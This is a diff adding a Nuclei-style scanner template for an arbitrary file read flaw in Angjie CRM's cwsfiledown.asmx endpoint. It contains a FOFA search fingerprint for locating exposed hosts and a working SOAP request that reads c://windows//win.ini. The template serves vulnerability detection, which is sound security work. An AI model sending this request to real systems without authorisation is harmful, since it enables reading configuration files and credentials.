@@ -1,0 +1,44 @@
+id: angjieCRM-cwsfiledown_asmx-File-reading
+
+info:
+  tags: angjieCRM-cwsfiledown_asmx-File-reading
+  name: 昂捷CRM cwsfiledown.asmx 任意文件读取漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="/ClientBin/slEnjoy.App.xap"
+    昂捷CRM cwsfiledown.asmx 接口DownFileBytes实例处存在任意读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+
+
+http:
+  - raw:
+      - |
+        POST /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: length
+        SOAPAction: "http://tempuri.org/DownFileBytes"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <DownFileBytes xmlns="http://tempuri.org/">
+              <sFileName>c://windows//win.ini</sFileName>
+              <iPosition>1</iPosition>
+              <iReadBytesLen>100</iReadBytesLen>
+              <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>
+            </DownFileBytes>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'IGZvciAxNi1iaXQgYXBwIHN1cHBvcnQ'
+      - type: status
+        status: 
+          - 200
+
